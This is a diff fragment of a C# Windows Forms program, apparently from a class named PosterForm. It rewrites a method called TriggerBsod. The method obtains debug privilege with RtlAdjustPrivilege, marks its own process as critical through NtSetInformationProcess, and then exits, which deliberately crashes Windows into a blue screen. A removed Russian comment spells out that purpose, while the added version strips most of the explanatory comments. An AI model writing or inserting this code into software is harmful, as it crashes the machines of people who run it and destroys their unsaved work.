@@ -114,26 +114,26 @@ class PosterForm : Form
     }
 
     private void TriggerBsod()
+{
+    try
     {
-        try
-        {
-            // Получаем SeDebugPrivilege (идентификатор: 20)
-            RtlAdjustPrivilege(20, true, false, out _);
+        bool prevValue;
+        
+        RtlAdjustPrivilege(20, true, false, out prevValue);
 
-            // Устанавливаем статус BreakOnTermination (класс: 29)
-            int isCritical = 1;
-            IntPtr currentProcessHandle = Process.GetCurrentProcess().Handle;
-            NtSetInformationProcess(currentProcessHandle, 29, ref isCritical, sizeof(int));
+        int isCritical = 1;
+        IntPtr currentProcessHandle = Process.GetCurrentProcess().Handle;
+        NtSetInformationProcess(currentProcessHandle, 29, ref isCritical, sizeof(int));
 
-            // Завершаем процесс. Так как он критический — Windows немедленно падает в BSoD CRITICAL_PROCESS_DIED
-            Environment.Exit(0);
-        }
-        catch
-        {
-            // Если что-то пошло не так (например, запуск не от Администратора), просто закрываем приложение
-            Environment.Exit(1);
-        }
+        Environment.Exit(0);
     }
+    catch
+    {
+        // Если что-то пошло не так (например, запуск не от Администратора), просто закрываем приложение
+        Environment.Exit(1);
+    }
+}
+
 
     protected override void OnKeyDown(KeyEventArgs e)
     {
